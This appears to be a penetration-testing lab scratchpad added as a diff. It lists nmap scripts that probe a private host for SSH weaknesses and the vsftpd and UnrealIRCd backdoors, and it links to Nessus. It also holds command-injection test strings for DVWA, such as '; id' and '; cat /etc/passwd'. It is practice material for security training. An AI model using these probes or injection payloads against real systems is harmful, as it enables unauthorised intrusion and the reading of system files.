@@ -1,0 +1,28 @@
+nmap -n -p22 --script ssh-* 172.16.189.188
+/usr/share/nmap/scripts
+https://nmap.org/nsedoc/
+nmap --script ftp-vsftpd-backdoor -p 21 
+nmap --script=irc-unrealircd-backdoor -p6667,6697 172.16.189.188
+
+
+https://www.tenable.com/products/nessus/select-your-operating-system	https://www.tenable.com/products/nessus/nessus-plugins/obtain-an-activation-codeDVWA 
+
+Command Execution 
+locahost 
+localhost ; id 
+localhost ; pwd 
+; ls -l 
+; cat /etc/passwd 
+
+
+Web 
+
+Command Injection
+
+127.0.0.1; id
+127.0.0.1; cat /etc/passwd
+
+
+'
+
+
